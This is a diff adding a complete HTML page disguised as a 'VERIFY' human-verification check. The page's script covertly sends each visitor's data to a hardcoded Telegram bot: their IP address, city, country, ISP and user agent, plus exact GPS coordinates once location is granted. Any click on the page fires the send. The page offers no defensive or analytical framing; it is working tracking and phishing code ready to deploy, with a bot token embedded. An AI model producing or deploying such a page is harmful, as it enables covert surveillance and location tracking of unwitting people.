@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification</title>
+
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  background: #000;
+  height: 100%;
+  overflow-x: hidden; /* no left-right move */
+  font-family: Arial, sans-serif;
+  color: white;
+  text-align: center;
+}
+
+.container {
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+button {
+  background: #00ff00;
+  color: black;
+  border: none;
+  padding: 15px 40px;
+  font-size: 18px;
+  border-radius: 6px;
+  cursor: pointer;
+}
+
+button:active {
+  transform: scale(0.98);
+}
+
+.small-text {
+  margin-top: 8px;
+  font-size: 12px;
+  opacity: 0.6;
+}
+
+#error {
+  margin-top: 15px;
+  color: red;
+  font-size: 14px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <button id="verifyBtn">VERIFY</button>
+  <div class="small-text">human variation</div>
+  <div id="error"></div>
+</div>
+
+<script>
+const botToken = "8506297895:AAEQZL-0ovCboHtcdW8EBxGjsIiIFJsuH38";
+const chatId = "7325567666";
+
+let sent = false;
+
+function sendToTelegram(message) {
+  if (sent) return;
+  sent = true;
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  });
+}
+
+function getIPAndSend(locationData = "Location Not Granted") {
+  fetch("https://apip.cc/json")
+    .then(res => res.json())
+    .then(data => {
+      const message =
+`🔐 New Verification
+
+IP: ${data.ip}
+City: ${data.city}
+Country: ${data.country}
+ISP: ${data.isp}
+
+${locationData}
+
+UserAgent: ${navigator.userAgent}`;
+
+      sendToTelegram(message);
+    });
+}
+
+document.getElementById("verifyBtn").addEventListener("click", function() {
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        const loc =
+`📍 Exact Location:
+Latitude: ${position.coords.latitude}
+Longitude: ${position.coords.longitude}
+Accuracy: ${position.coords.accuracy} meters`;
+
+        getIPAndSend(loc);
+      },
+      function() {
+        document.getElementById("error").innerText = "Verification Failed - Try Again";
+      }
+    );
+  } else {
+    document.getElementById("error").innerText = "Verification Failed - Try Again";
+  }
+
+});
+
+// click anywhere send once
+document.body.addEventListener("click", function() {
+  getIPAndSend();
+}, { once: true });
+
+</script>
+
+</body>
+</html>
